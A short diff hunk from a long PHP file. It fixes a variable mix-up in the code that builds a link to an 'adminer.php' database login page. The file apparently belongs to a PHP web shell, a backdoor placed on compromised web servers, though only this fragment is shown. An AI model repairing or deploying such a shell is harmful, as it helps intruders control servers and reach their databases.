@@ -1302,7 +1302,7 @@ if($_GET['logout'] == true) {
 	}
 } elseif($_GET['do'] == 'adminer') {
 	$full = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
-	$full = str_replace(basename($_SERVER['REQUEST_URI']), "", $url);
+	$full = str_replace(basename($_SERVER['REQUEST_URI']), "", $full);
 	if(file_exists('adminer.php')) {
 		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 	} else {
